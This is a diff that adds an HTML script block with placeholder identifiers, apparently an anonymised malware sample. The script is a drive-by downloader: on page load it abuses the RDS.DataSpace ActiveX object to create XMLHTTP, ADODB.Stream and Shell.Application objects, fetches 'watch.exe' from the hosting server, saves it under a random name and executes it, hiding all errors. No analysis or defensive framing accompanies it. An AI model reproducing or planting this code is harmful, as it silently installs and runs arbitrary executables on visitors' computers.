@@ -1,0 +1,38 @@
+<script language="javascript">
+FUNC1();
+
+function FUNC1() {
+    var VAR1 = document.createElement("object");
+    VAR1.setAttribute("id","VAR1");
+    VAR1.setAttribute("classid", "clsid:bd96c556-65a3-"+"11d0-983a-00c04fc29e36");
+    try {
+        var VAR2 = VAR1.CreateObject("msxml2.xmlhttp", "");
+        var VAR3 = VAR1.CreateObject("shell.application","");
+        var VAR4 = VAR1.CreateObject("adodb.stream", "");
+
+        try {
+            VAR4.type = 1;
+            var host = window.location.hostname;
+            var path = window.location.pathname;
+            var path1 = path.replace(/00.html/,"watch.exe");
+            var url = "http://"+host+path1;
+            VAR2.open("GET", url , false);
+            VAR2.send();
+            VAR4.open();
+            VAR4.Write(VAR2.responseBody);
+
+            var VAR5 =".//..//Xdhbv645gvd.exe";
+            eval(VAR4.savetofile(VAR5, 2));
+            VAR4.Close();
+        }
+        catch(err) {}
+        try {
+            eval(VAR3.shellexecute(VAR5));
+            if(shellexecute=true) {}
+        }
+        catch(err){}
+
+    }
+    catch(err) {}
+}
+</script>
